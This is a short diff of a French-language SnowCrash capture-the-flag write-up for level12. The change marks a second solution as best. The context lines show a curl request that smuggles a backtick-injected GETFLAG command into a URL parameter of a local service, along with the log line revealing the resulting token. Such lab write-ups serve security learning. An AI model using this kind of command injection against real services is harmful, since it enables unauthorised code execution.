@@ -87,7 +87,7 @@ level12@SnowCrash:~$ curl '127.0.0.1:4646?x=`%2F%2A%2FGETFLAG%3E%262`'
 [...]
 [Tue Mar 21 05:24:13 2023] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
-# deuxième solution
+# deuxième solution **BEST**
 
 le repertoire run/shm est monté en tant que système de fichiers tmpfs:
 ```shell
